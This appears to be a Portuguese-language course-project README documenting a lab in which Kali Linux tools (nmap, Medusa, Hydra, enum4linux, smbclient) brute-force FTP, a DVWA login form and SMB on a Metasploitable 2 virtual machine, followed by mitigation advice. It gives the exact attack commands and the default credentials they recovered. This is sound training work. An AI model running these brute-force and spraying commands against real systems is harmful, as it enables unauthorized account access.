# Protocolos-de-Autentica-o-Brute-force

Desafio Dio Santander

Projeto Prático – Cibersegurança 2025

Curso: Protocolos de Autenticação & Brute Force

Instrutora: Isadora Ferrão

Plataforma: DIO + Santander

Objetivo

Desenvolver, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (como Metasploitable 2 e DVWA), para simular cenários de ataques de força bruta e aplicar medidas de mitigação.

Etapas do Projeto

1. Configuração do Ambiente

•	Criação de duas máquinas virtuais (Kali Linux e Metasploitable 2) no VirtualBox.

•	Rede interna configurada em modo “host-only”.

2. Ataques Simulados

•	Força bruta em FTP.

•	Automação de tentativas em formulário web (DVWA).

•	Password spraying em SMB com enumeração de usuários.

3. Documentação dos Testes

•	Uso de wordlists simples.

•	Registro dos comandos utilizados.

•	Validação de acessos obtidos.

•	Recomendações de mitigação.

Conceitos Fundamentais

Protocolos de Autenticação

São métodos utilizados para validar a identidade de usuários ou serviços antes de conceder acesso. Exemplos:

•	HTTP Basic/Digest: simples, usado em aplicações web.

•	Form-based: autenticação via formulários HTML.

•	NTLM/SMB: protocolo legado da Microsoft.

•	Kerberos: baseado em tickets, usado em ambientes AD.

•	LDAP/AD Bind: autenticação em diretórios.

•	SSH: autenticação por senha ou chave pública.

•	RDP: acesso remoto a desktops Windows.

•	OAuth/OpenID Connect: autenticação moderna para APIs e web apps.

Tipos de Ataques de Força Bruta

•	Online brute-force: tentativa direta contra serviços ativos.

•	Offline brute-force: quebra de hashes localmente.

•	Credential stuffing: uso de credenciais vazadas.

•	Password spraying: teste de senhas comuns em múltiplos usuários.

•	Dictionary attacks: uso de listas de palavras com variações.

Ferramentas Utilizadas

•	Kali Linux: sistema operacional voltado para segurança da informação.

•	Metasploitable 2: VM Linux vulnerável para testes.

•	Medusa: ferramenta de brute-force rápida e paralela.

•	Hydra: ferramenta de brute-force para diversos serviços.

•	Ncrack: focada em autenticação de rede.

•	John the Ripper: quebra de senhas a partir de hashes.

•	WPScan: auditoria de segurança em sites WordPress.

•	Nmap: varredura de rede e detecção de serviços.

•	Enum4linux: enumeração de usuários e serviços SMB.

Execução dos Testes

Varredura de Rede com Nmap

nmap -sV -p 21,22,80,445,139 192.168.56.103

Resultado: portas FTP, SSH, HTTP e SMB abertas, todas com versões vulneráveis.

Ataque FTP com Medusa

medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6 -f

Credenciais encontradas: msfadmin:msfadmin.

Teste de Login via Cliente FTP

ftp 192.168.56.103

Acesso confirmado com comandos como ls, get, put, etc.

Ataque a Formulário Web (DVWA)

Como o módulo http-m do Medusa não estava disponível, foi utilizado o Hydra:

hydra -L users.txt -P pass.txt 192.168.56.103 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 6

Credenciais encontradas: admin:password.

 Ataque SMB com Enumeração e Password Spraying

enum4linux -a 192.168.56.103 | tee enum_output.txt

Usuários identificados: msfadmin, root, postgre, usr, nservice.

Ataque com Medusa:

medusa -h 192.168.56.103 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

Credenciais válidas: msfadmin:msfadmin.

Validação com smbclient:

smbclient -L //192.168.56.103 -U msfadmin

Acesso confirmado aos shares: print$, tmp, opt, ADMIN$, msfadmin.

Medidas de Mitigação

Autenticação

•	Implementar MFA/2FA.

•	Exigir senhas fortes e únicas.

•	Utilizar autenticação por chave pública (SSH).

Controle de Acesso

•	Limitar tentativas por IP/usuário.

•	Bloquear contas após múltiplas falhas.

•	Monitorar e alertar sobre tentativas suspeitas.

Hardening de Serviços

•	Atualizar softwares vulneráveis.

•	Aplicar patches de segurança.

•	Remover serviços desnecessários.

Proteção de Rede

•	Desabilitar SMBv1.

•	Usar FTPS/SFTP em vez de FTP.

•	Segmentar redes e configurar firewalls adequadamente.

 Conclusão

A segurança da informação vai muito além de antivírus e firewalls. É essencial considerar fatores humanos, políticas organizacionais e práticas de defesa proativas. O conhecimento técnico aliado à conscientização é a chave para ambientes mais seguros.
A segurança da informação vai muito além de antivírus e firewalls. É essencial considerar fatores humanos, políticas organizacionais e práticas de defesa proativas. O conhecimento técnico aliado à conscientização é a chave para ambientes mais seguros.

